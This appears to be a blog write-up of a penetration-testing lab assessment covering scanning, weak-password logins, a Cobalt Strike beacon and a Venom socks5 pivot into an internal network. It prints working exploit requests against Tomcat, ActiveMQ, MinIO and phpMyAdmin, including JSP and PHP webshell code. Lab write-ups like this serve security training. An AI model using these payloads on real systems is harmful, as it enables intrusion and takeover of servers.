# 渗透测试考核--两层内网 cs windows socks5

这里考核为渗透

这里是网络拓扑图



<img src="https://i-blog.csdnimg.cn/blog_migrate/154eaaa7742e6bc74af80823f3b47fce.png" alt="" style="max-height:577px; box-sizing:content-box;" />


这里记录一下

两台外网

两台内网

首先拿到C段nmap进行扫描

## 外网1

```cobol
nmap -p 80  172.16.17.2/24 
```

主机存活 一般都是web服务入手 所以我们指定80端口 然后去查找开放的

最后获取到2个ip

```cobol
Nmap scan report for 172.16.17.177
Host is up (0.045s latency).
 
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 9C:B6:D0:6D:50:71 (Rivet Networks)
 
Nmap scan report for 172.16.17.134
Host is up (0.050s latency).
 
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 9C:B6:D0:6D:50:71 (Rivet Networks)
```

我们首先查看 177的ip

扫描全端口

再扫描的时候 我们去看看web服务



<img src="https://i-blog.csdnimg.cn/blog_migrate/fb3a00e73fe5943b224ec1d779bb76ea.png" alt="" style="max-height:682px; box-sizing:content-box;" />


发现是织梦

这里我们学过 我们拼接 dede 可以直接跳转到管理员



<img src="https://i-blog.csdnimg.cn/blog_migrate/eaef84ce921821f25ad4e37dca90669e.png" alt="" style="max-height:502px; box-sizing:content-box;" />


弱口令爆破一波 为 admin/1q2w3e4r

然后可以直接getshell

### GETSHELL



<img src="https://i-blog.csdnimg.cn/blog_migrate/32e0ba08cfb851cb5fda47f85b126ded.png" alt="" style="max-height:701px; box-sizing:content-box;" />


进入文件管理 然后就可以上传文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/a89d72d3990146fdb0d0d326a450e568.png" alt="" style="max-height:403px; box-sizing:content-box;" />


然后我们可以通过哥斯拉的zip模式 将网站down下来



<img src="https://i-blog.csdnimg.cn/blog_migrate/acae9d7d6309a91c7402bf491697ea5b.png" alt="" style="max-height:465px; box-sizing:content-box;" />


然后使用命令查看flag

```perl
grep -r flag /路径
```

但是发现都是内容 看的眼睛难受 我们自己来获取吧

### 



<img src="https://i-blog.csdnimg.cn/blog_migrate/2f4da2b20e5ee0f5f44a1cb508a812a2.png" alt="" style="max-height:142px; box-sizing:content-box;" />


内网获取就去看看数据库

搜了一下织梦的database在哪里

```cobol
C:/phpstudy_pro/WWW/data/common.inc.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0f692175d638925fe5cbaaf6e9d41dcb.png" alt="" style="max-height:188px; box-sizing:content-box;" />


哥斯拉中链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/6aad0113e66671effaf8d7fcd84a7ee7.png" alt="" style="max-height:480px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/d89449296d13192058b513b3e50cd2b0.png" alt="" style="max-height:270px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f74e7559d1d49a806be768ebd8deb7de.png" alt="" style="max-height:195px; box-sizing:content-box;" />


然后这里因为是window我们考虑使用cs上线

### CS上线

链接：https://pan.baidu.com/s/1mpu0W5almTLXBtm7S6ZTyQ?pwd=h3kr  
提取码：h3kr  
--来自百度网盘超级会员V3的分享

上面是cs的链接

这里进行演示 这里我是使用wsl的虚拟机系统 如果是vm也是一样操作

这里也介绍一下cs的使用

首先是启动

这里列举两个方式 首先是windows然后就是linux

java 环境需要11以上

```cobol
.\teamserver 172.16.17.13 123
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/841e9cc1322aae6bd9361be6ece9d2b9.png" alt="" style="max-height:188px; box-sizing:content-box;" />
然后cs上线



<img src="https://i-blog.csdnimg.cn/blog_migrate/45861993916711d5d7f263c8b4c64ad0.png" alt="" style="max-height:332px; box-sizing:content-box;" />


然后我们开始设置监听



<img src="https://i-blog.csdnimg.cn/blog_migrate/c34d55c38615f6245ae4157c611f2e2e.png" alt="" style="max-height:317px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/6219fb1fe525452bc1526e3840485659.png" alt="" style="max-height:612px; box-sizing:content-box;" />


端口随便写就行了

开始生成木马



<img src="https://i-blog.csdnimg.cn/blog_migrate/b8903a1b335f1353675369131606433f.png" alt="" style="max-height:328px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/89aeec487fe94da460730208d57808fb.png" alt="" style="max-height:77px; box-sizing:content-box;" />


执行木马



<img src="https://i-blog.csdnimg.cn/blog_migrate/fc943cf54aaae3509deeb7326f7cc7e1.png" alt="" style="max-height:229px; box-sizing:content-box;" />


上线成功 我们开始查看基本信息

首先设置回连



<img src="https://i-blog.csdnimg.cn/blog_migrate/7d78647180ca5b8cf99c4dfe47dc25fc.png" alt="" style="max-height:278px; box-sizing:content-box;" />


修改为0

然后在我们的会话中执行

```undefined
shell ipconfig
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5e073ae8f3f4e24829c31630906fc5cf.png" alt="" style="max-height:440px; box-sizing:content-box;" />


发现二层内网

这里进行查看存活



<img src="https://i-blog.csdnimg.cn/blog_migrate/56de39573bf41c596393a8bee7ca7252.png" alt="" style="max-height:249px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/17b277b4e71c6b4b9397f6991057d88a.png" alt="" style="max-height:277px; box-sizing:content-box;" />


经过发现 这里只有 192存在其他主机 所以我们开始扫192的



<img src="https://i-blog.csdnimg.cn/blog_migrate/bc28c05f99d277796638ae06bb129329.png" alt="" style="max-height:133px; box-sizing:content-box;" />


主机发现成功了

然后就发现存在

8080   9001 9000 80  8161这些端口

现在开始做代理

对了这里的flag在 用户的文档下可以找到



<img src="https://i-blog.csdnimg.cn/blog_migrate/75ece89334a00f11629fb9d1cd1e8082.png" alt="" style="max-height:563px; box-sizing:content-box;" />


然后我们开始搞代理

我们这里使用

Venom 建立 socks5代理

```cobol
我们的主机执行
 
 
./admin.exe -lport 5678
 
 
靶机执行 
 
agent.exe  -rhost 172.16.17.13 -rport 5678
 
 
然后再admin就会回显
 
 
show info
 
 
goto 1
 
socks 1080
```

即可实现socks5代理

然后我们就实现建立socks5代理

然后我们通过浏览器的代理设置 即可访问 192.168.31.131的web服务



<img src="https://i-blog.csdnimg.cn/blog_migrate/92a8cc4033575424e40236329e810360.png" alt="" style="max-height:221px; box-sizing:content-box;" />


### ubuntu内网- web1 Apache Tomcat/8.5.19

搜一下有什么漏洞

发现存在一个文件写入漏洞

需要bp的帮助 这里顺便设置一下bp的socks5代理



<img src="https://i-blog.csdnimg.cn/blog_migrate/c402eef6760d9fd12bb5e1175f7c36ca.png" alt="" style="max-height:484px; box-sizing:content-box;" />


然后我们浏览器开 bp抓包 就会从 8080 走到 1080 然后就可以实现

然后我们开始复现

首先在主页刷新抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/df03ae584b717b769314719c6a448cc5.png" alt="" style="max-height:333px; box-sizing:content-box;" />


修改为下面的请求包 然后这里 jsp 后面加 / 是为了绕过检测 否则无法上传

```cobol
PUT /1.jsp/ HTTP/1.1
Host: 192.168.31.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
 
jsp的一句话木马
```

```cobol
HTTP/1.1 201 
Content-Length: 0
Date: Tue, 28 Nov 2023 13:24:01 GMT
Connection: close
 
```

上传成功 我们直接访问即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/954eb7b22d113f2054d1962844310c44.png" alt="" style="max-height:120px; box-sizing:content-box;" />


getshell  然后通过哥斯拉访问（我这个是哥斯拉马）



<img src="https://i-blog.csdnimg.cn/blog_migrate/b823fbd66369c70c59fc58cadd1f00e7.png" alt="" style="max-height:520px; box-sizing:content-box;" />


记得配置socks5代理

flag在 根目录

### ubuntu内网- web2 shiro

这里我们开始看8080端口

<img src="https://i-blog.csdnimg.cn/blog_migrate/bc05678f6fa4ca4b8005b98599fef66c.png" alt="" style="max-height:403px; box-sizing:content-box;" />


然后我们抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/3ac50164eaecf4d6db45c4cfabbf3bcb.png" alt="" style="max-height:465px; box-sizing:content-box;" />


发现shiro框架 remember

直接工具一把锁



<img src="https://i-blog.csdnimg.cn/blog_migrate/7c024419e4b3a1ab9f87e3bf1eb0f942.png" alt="" style="max-height:323px; box-sizing:content-box;" />


配置工具代理



<img src="https://i-blog.csdnimg.cn/blog_migrate/2a5a61bdf9c74bb332a20eedc513dcae.png" alt="" style="max-height:541px; box-sizing:content-box;" />


直接getshell了 flag也在根目录



<img src="https://i-blog.csdnimg.cn/blog_migrate/4673988afdc9889eca2a30632937b78b.png" alt="" style="max-height:336px; box-sizing:content-box;" />


### ubuntu内网- web3 activemq

8161端口

这里存在登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/e08593e30165a5a96c7f21c2608e847d.png" alt="" style="max-height:261px; box-sizing:content-box;" />


这里存在manage 点击 发现 登入 弱口令 admin/admin

实现登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/a1203c949124e61ff05d6b6fb5079edc.png" alt="" style="max-height:437px; box-sizing:content-box;" />


发现 5.11.1版本 搜索 发现文件上传漏洞

这里我们需要去看我们的路径

```cobol
http://192.168.31.131:8161/admin/test/systemProperties.jsp
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/58c957af76b419a01db9c15e76481a7d.png" alt="" style="max-height:73px; box-sizing:content-box;" />


记住绝对路径

然后通过bp进行抓包

修改为下面的内容 （这里需要先登入后台）

```cobol
PUT /fileserver/1.txt HTTP/1.1
Host: 192.168.31.131:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Fri, 13 Feb 2015 18:05:11 GMT
 
<%@ page import="java.io.*"%>
<%
 out.print("Hello</br>");
 String strcmd=request.getParameter("cmd");
 String line=null;
 Process p=Runtime.getRuntime().exec(strcmd);
 BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
 
 while((line=br.readLine())!=null){
  out.print(line+"</br>");
 }
```

```cobol
HTTP/1.1 204 No Content
Connection: close
Server: Jetty(8.1.16.v20140903)
```

上传成功 但是去访问是没有的 我们通过move的协议 将他移动到 api下

```cobol
MOVE /fileserver/1.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/api/s.jsp
Host: 192.168.31.131:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Fri, 13 Feb 2015 18:05:11 GMT
Content-Length: 328
 
<%@ page import="java.io.*"%>
<%
 out.print("Hello</br>");
 String strcmd=request.getParameter("cmd");
 String line=null;
 Process p=Runtime.getRuntime().exec(strcmd);
 BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
 while((line=br.readLine())!=null){
 out.print(line+"</br>");
 }
%>
```

这里的 destination 是我们刚刚的获取的路径 然后加上 后面的路径实现移动

这里我的回显是

```cobol
HTTP/1.1 204 No Content
Connection: close
Server: Jetty(8.1.16.v20140903)
 
```

然后去到 /api/s.jsp下

执行命令

```cobol
http://192.168.31.131:8161/api/s.jsp?cmd=ls
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d5a613e861229894bd472c8c10d14e0a.png" alt="" style="max-height:308px; box-sizing:content-box;" />


一样 cat /flag

### ubuntu内网- web4 minio

9001端口

为minio 我们去查看一下有什么漏洞

发现存在信息泄露

然后这里的请求包

注意这里的内容 需要修改为 9000 （原本的minio是 9001）



<img src="https://i-blog.csdnimg.cn/blog_migrate/25617ff4fca6dee431a25fae19f31c47.png" alt="" style="max-height:573px; box-sizing:content-box;" />


```cobol
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: 192.168.31.131:9000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 28 Nov 2023 13:43:22 GMT
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf3e54d022aa65ce8e4ea697263bbac7.png" alt="" style="max-height:281px; box-sizing:content-box;" />


用户密码 全部泄露 直接登入即可

然后flag在 容器里



这里我们就打通了 3台机器

然后这里还存在 一台外网机器

我们开始打

## 外网2

这里通过扫描 可以发现 134还存在 一台靶机



<img src="https://i-blog.csdnimg.cn/blog_migrate/3d05f7dfe336d02261c3ddbb01220c44.png" alt="" style="max-height:255px; box-sizing:content-box;" />


发现403 说明存在内容 但是没有 我们开始目录扫描

这里使用 dirsearch



<img src="https://i-blog.csdnimg.cn/blog_migrate/80f2980cc9afc786f6f362fe0cef30d4.png" alt="" style="max-height:256px; box-sizing:content-box;" />


然后我们去访问 发现phpmyadmin 存在弱口令 root root 登入后台

然后我们flag 就存在 admin下

然后我们去搜 phpadmin 如何getshell 这里选择日志注入



```sql
select @@datadir;
 
查看路径
 
show variables like '%general%';
 
 
查看日志功能
 
 
SET GLOBAL general_log='on';
 
SHOW VARIABLES LIKE '%general%';
 
 
开启日志
 
 
然后我们通过指定日志写入地址 实现注入
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4a71d6148f9bfddc04f67ebf4a7c9136.png" alt="" style="max-height:256px; box-sizing:content-box;" />


获取到地址 然后开始写入

这里还有一个获取地址的方法

通过php探针 我们在上面扫到了 l.php 去访问一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/f4d99ece097247e028d021ccf4c92782.png" alt="" style="max-height:278px; box-sizing:content-box;" />


```cobol
set global general_log_file ='C:\\phpstudy_pro\\WWW\\shell.php'
```

然后我们去访问一下

然后写入木马

```csharp
select '<?php @eval($_POST[cmd]);?>'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/85cc9537883c6b50ae565e966391be88.png" alt="" style="max-height:226px; box-sizing:content-box;" />


getshell 了 然后去看内网 flag就两个是在源代码中 另一个在user的文档中

这里考核的渗透就实现了